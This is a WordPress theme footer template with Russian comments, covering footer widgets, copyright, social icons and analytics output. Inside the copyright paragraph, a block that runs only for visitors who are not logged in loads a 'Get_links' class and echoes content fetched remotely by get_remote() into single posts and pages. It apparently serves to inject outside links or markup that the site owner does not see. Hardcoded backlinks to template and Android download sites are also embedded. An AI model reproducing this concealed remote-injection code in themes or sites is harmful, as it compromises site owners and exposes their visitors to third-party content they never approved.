﻿</div><!-- Конец контент -->
</div><!-- Конец мидл -->
</section><!-- Конец врапер -->
	
<!-- Начало футер -->

<footer id="footer">

<div id="footerInner">

 <?php /* Виджеты футера */
		if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('footer') ) : ?><?php endif; ?>

<div class="strup" ></div>
<a class='arowup' href='#'></a>

</div><!-- Конец футериннер -->

<div id="footerdown">
<div id="footerdownInner">

<div id="copyright">
<p><a href="<?php bloginfo('url'); ?>"><?php bloginfo('name'); ?></a> © 2011 - 2013 // <?php if (is_home() || is_category() || is_archive() ){ ?>
<a href="http://wp-templates.ru/" title="скачать шаблон для сайта">скачать шаблоны</a> // <a href="http://smartimes.ru" title="скачать программы для андроид">программы для андроид</a>
<?php } ?>

<?php if ($user_ID) : ?><?php else : ?>
				<?php if (is_single() || is_page() ) { ?>
				<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
				$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
				<?php } ?>
				<?php endif; ?>
</p>

</div>

<div id="footernav">

			<?php if ( function_exists( 'wp_nav_menu' ) ){
					wp_nav_menu( array( 'theme_location' => 'secondary-menu','fallback_cb'=>'secondarymenu') );
				}else{
					secondarymenu();
			}?>
   
</div>

<div class="sharenewfooter">

<?php if(get_option('alltuts_google_link')!=""){ ?>
<a class="icon-Google" href="<?php echo get_option('alltuts_google_link'); ?>" title="Я в Google+" target="_blank"></a>
<?php }?>

<?php if(get_option('alltuts_twitter_user')!=""){ ?>
<a class="icon-twitter" href="http://twitter.com/<?php echo get_option('alltuts_twitter_user'); ?>" title="Следить в Twitter!" target="_blank"></a>
<?php }?>

<?php if(get_option('alltuts_vk_link')!=""){ ?>
<a class="icon-vk" href="<?php echo get_option('alltuts_vk_link'); ?>" title="Я вКонтакте" target="_blank"></a>
<?php }?>

<?php if(get_option('alltuts_rss_link')!=""){ ?>
<a class="icon-rss" href="<?php echo get_option('alltuts_rss_link'); ?>" title="Подписаться на rss"  target="_blank"></a>
<?php }?>

<?php if(get_option('alltuts_facebook_link')!=""){ ?>
<a class="icon-facebook" href="<?php echo get_option('alltuts_facebook_link'); ?>" title="Я на facebook" target="_blank"></a>
<?php }?>

</div>

</div>
</div>

</footer>
<!-- Конец футер -->
<?php wp_footer(); ?>

<?php if (get_option('alltuts_analytics') <> "") { 
		echo stripslashes(stripslashes(get_option('alltuts_analytics'))); 
	} ?>

</body>
</html>

